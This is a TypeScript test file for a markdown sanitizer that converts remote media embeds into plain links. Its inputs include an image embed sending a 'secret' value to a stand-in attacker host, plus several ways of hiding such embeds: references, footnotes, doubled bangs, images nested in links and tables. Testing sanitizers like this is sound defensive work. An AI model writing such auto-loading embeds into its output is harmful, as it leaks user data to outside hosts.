// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 Jnana Project

import { describe, it, expect } from 'vitest'
import { unified } from 'unified'
import remarkParse from 'remark-parse'
import remarkGfm from 'remark-gfm'
import { visit } from 'unist-util-visit'
import type { Root } from 'mdast'
import { neutralizeEmbeds } from './neutralizeEmbeds'

/** Every image the renderer would see, as `alt|url` (reference images as `ref:alt`). */
const images = (md: string): string[] => {
  const out: string[] = []
  visit(unified().use(remarkParse).use(remarkGfm).parse(md) as Root, (n) => {
    if (n.type === 'image') out.push(`${n.alt}|${n.url}`)
    if (n.type === 'imageReference') out.push(`ref:${n.alt}`)
  })
  return out
}

describe('neutralizeEmbeds', () => {
  it('turns a remote webpage embed into a plain link', () => {
    const out = neutralizeEmbeds('See ![webpage](https://evil.example/?d=secret) now')
    expect(images(out)).toEqual([])
    expect(out).toContain('[webpage](https://evil.example/?d=secret)')
  })

  it('neutralizes every remote media form: image, video, audio, pdf, youtube', () => {
    const md = [
      '![](https://e.example/a.png)',
      '![video](https://e.example/v.mp4)',
      '![audio](https://e.example/a.mp3)',
      '![pdf](https://e.example/d.pdf)',
      '![youtube](https://www.youtube.com/watch?v=abc)',
      '![x](<https://e.example/a b.png> "t")',
    ].join('\n\n')
    expect(images(neutralizeEmbeds(md))).toEqual([])
  })

  it('neutralizes reference-style and footnote-hidden images', () => {
    const md = '![webpage][r]\n\n![webpage]\n\n[^1]: ![webpage](https://e.example/f)\n\nx[^1]\n\n[r]: https://e.example/r\n[webpage]: https://e.example/s'
    expect(images(md).length).toBeGreaterThan(0)
    expect(images(neutralizeEmbeds(md))).toEqual([])
  })

  it('neutralizes nested and doubled bangs and images inside links and tables', () => {
    const md = '!![webpage](https://e.example/1) \\\\![webpage](https://e.example/2) [![x](https://e.example/3)](https://e.example/l)\n\n| a |\n| - |\n| ![webpage](https://e.example/4) |'
    expect(images(md)).toHaveLength(4)
    expect(images(neutralizeEmbeds(md))).toEqual([])
  })

  it('keeps local jnana-asset media but never a webpage embed', () => {
    const md = '![video](jnana-asset://clip.mp4)\n\n![](jnana-asset://pic.png)\n\n![webpage](jnana-asset://x)'
    expect(images(neutralizeEmbeds(md))).toEqual(['video|jnana-asset://clip.mp4', '|jnana-asset://pic.png'])
  })

  it('leaves text without embeds byte-identical, including code', () => {
    const md = 'Plain [link](https://a.example) and `![webpage](https://x)`\n\n```\n![webpage](https://y)\n```'
    expect(neutralizeEmbeds(md)).toBe(md)
  })
})
